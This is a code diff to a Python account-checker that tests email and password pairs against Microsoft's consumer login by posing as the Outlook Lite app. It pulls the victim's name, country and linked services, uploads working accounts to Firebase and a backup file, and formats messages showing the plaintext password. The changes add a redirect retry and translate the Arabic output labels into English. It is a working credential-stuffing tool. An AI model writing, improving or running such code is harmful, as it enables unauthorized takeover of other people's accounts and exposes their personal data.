@@ -42,6 +42,7 @@ def get_infoo(session: requests.Session, email: str, token: str, cid: str) -> di
         response = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=REQUEST_TIMEOUT)
         if response.status_code == 200:
             profile_data = response.json()
+            # Fix: Ensure 'names' exists before accessing it
             if profile_data.get('names'): details['name'] = profile_data['names'][0].get('displayName', 'N/A')
             if profile_data.get('accounts'):
                 location_code = profile_data['accounts'][0].get('location', '')
@@ -60,6 +61,10 @@ def get_token(session: requests.Session, email: str) -> Optional[dict]:
         token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
         token_data = {"client_info": "1", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
         response = session.post(token_url, data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=REQUEST_TIMEOUT)
+        if response.status_code == 302: # Should be 302 for redirect to get token
+            session.headers.update(response.headers)
+            details = get_token(session, email)
+            return details
         if response.status_code == 200:
             token = response.json().get("access_token")
             if token: return get_infoo(session, email, token, cid)
@@ -94,7 +99,7 @@ def get_values_and_login(session: requests.Session, email: str, password: str) -
                 pl = pl_match_legacy.group(1)
         if not ppft or not pl: return None, "Page Parse Error"
         post_content = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
-        post_headers = {"User-Agent": ua, "Pragma": "no-cache", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "keep-alive", "Content-Length": str(len(post_content)), "Cache-Control": "max-age=0", "Origin": "https://login.live.com", "X-Requested-With": "com.microsoft.outlooklite", "Referer": resp1.url, "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Content-Type": "application/x-www-form-urlencoded"}
+        post_headers = {"User-Agent": ua, "Pragma": "no-cache", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "keep-alive", "Content-Length": str(len(post_content)), "Cache-Control": "max-age=0", "Origin": "https://login.live.com", "X-Requested-With": "com.microsoft.outlooklite", "Referer": resp1.url, "Accept-Encoding": "gzip, deflate", "Accept-language": "en-US,en;q=0.9", "Content-Type": "application/x-www-form-urlencoded"}
         resp2 = session.post(pl, data=post_content, headers=post_headers, allow_redirects=False, timeout=REQUEST_TIMEOUT)
         if resp2.status_code == 302 and 'Location' in resp2.headers and 'oauth20_desktop.srf' in resp2.headers['Location']:
             session.headers.update(resp2.headers)
@@ -131,7 +136,6 @@ async def upload_to_firebase(account_data: Dict) -> Optional[str]:
                 if response.status == 200:
                     data = await response.json()
                     doc_id = data['name']
-                    # Link generation is not needed here as we don't have BOT_USERNAME
                     logger.info(f"Uploaded {account_data['email']} to Firebase with ID: {doc_id}")
                     return doc_id
     except Exception as e:
@@ -147,18 +151,18 @@ async def save_to_backup_file(account_data: Dict):
 
 def format_result_message(account_data: Dict, save_to_db: bool) -> str:
     name_str = account_data.get("name", "N/A")
-    services_str = ", ".join(account_data.get("services", [])) or "لا توجد خدمات مرتبطة"
+    services_str = ", ".join(account_data.get("services", [])) or "No linked services found"
     country_name, country_flag = get_country_name_and_flag(account_data.get('country', 'Unknown'))
     
-    status_line = "✅ **حساب سليم ومفصل**"
+    status_line = "✅ **Valid Account Details**"
     if save_to_db:
-        status_line += "\n💾 **تم الحفظ في قاعدة البيانات**"
+        status_line += "\n💾 **Saved to Database**"
         
     return (f"{status_line}\n"
             f"➖➖➖➖➖➖➖➖➖➖➖➖\n"
-            f"👤 **الاسم:** {name_str}\n"
-            f"📧 **البريد:** `{account_data['email']}`\n"
-            f"🔑 **كلمة المرور:** `{account_data['password']}`\n"
-            f"🌍 **الدولة:** {country_flag} *{country_name}*\n"
-            f"🔗 **الخدمات المرتبطة:** {services_str}\n"
+            f"👤 **Name:** {name_str}\n"
+            f"📧 **Email:** `{account_data['email']}`\n"
+            f"🔑 **Password:** `{account_data['password']}`\n"
+            f"🌍 **Country:** {country_flag} *{country_name}*\n"
+            f"🔗 **Linked Services:** {services_str}\n"
             f"➖➖➖➖➖➖➖➖➖➖➖➖")
